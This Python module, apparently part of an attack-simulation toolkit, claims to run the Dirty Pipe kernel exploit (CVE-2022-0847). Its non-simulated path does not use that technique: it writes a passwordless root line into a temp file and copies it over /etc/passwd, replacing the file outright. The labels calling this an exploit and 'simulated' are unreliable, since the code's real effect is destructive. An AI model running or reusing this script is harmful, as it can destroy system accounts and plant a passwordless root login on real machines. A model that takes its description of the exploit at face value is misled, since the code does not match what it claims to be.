# attacks/dirty_pipe_escalation.py

import os
import subprocess

def run(container=None, simulate=False):
    print("[*] Running Dirty Pipe Exploit (CVE-2022-0847)...")

    if simulate:
        print("[SIMULATE] Would attempt to overwrite protected file using dirty pipe technique.")
        return "Simulated Dirty Pipe exploit run."

    try:
        # Confirm kernel version (dirty pipe only works on 5.8+ and <5.16.11)
        uname = subprocess.check_output(["uname", "-r"]).decode()
        print(f"[*] Kernel version: {uname.strip()}")

        # Dummy write attempt to /etc/passwd to simulate overwrite
        overwrite_target = "/etc/passwd"
        payload = "root::0:0:pwned:/root:/bin/bash\\n"

        # Attempt to write via vulnerable behavior (simplified)
        with open("/tmp/payload.txt", "w") as f:
            f.write(payload)

        result = subprocess.run(
            ["cp", "/tmp/payload.txt", overwrite_target],
            capture_output=True,
            text=True
        )

        if result.returncode == 0:
            return "Exploit succeeded: /etc/passwd overwritten (simulated method)."
        else:
            return f"Exploit attempt failed: {result.stderr.strip()}"

    except Exception as e:
        return f"Exploit failed: {str(e)}"